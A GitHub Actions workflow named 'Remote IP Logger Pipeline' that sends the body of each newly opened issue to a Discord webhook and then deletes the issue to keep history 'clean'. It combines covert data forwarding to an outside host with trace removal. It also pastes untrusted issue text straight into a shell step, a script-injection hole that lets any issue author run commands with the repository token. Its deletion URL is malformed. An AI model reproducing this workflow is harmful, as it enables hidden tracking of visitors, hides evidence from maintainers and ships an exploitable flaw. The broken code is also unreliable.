name: Remote IP Logger Pipeline

on:
  issues:
    types: [opened]

jobs:
  send_log:
    runs-on: ubuntu-latest
    steps:
      - name: Send Details to Discord and Clean Up
        run: |
          # 1. Forward the data package safely straight into your private Discord Webhook vault
          PAYLOAD='{
            "content": "**New Visitor Logged via Tokenless Pipeline**\n${{ github.event.issue.body }}"
          }'
          
          curl -X POST -H "Content-Type: application/json" \
               -d "$PAYLOAD" \
               "${{ secrets.DISCORD_WEBHOOK }}"

          # 2. Immediately self-delete the issue log so your public history stays clean
          curl -X DELETE \
               -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
               -H "Accept: application/vnd.github.v3+json" \
               "https://github.com{{ github.repository }}/issues/${{ github.event.issue.number }}"
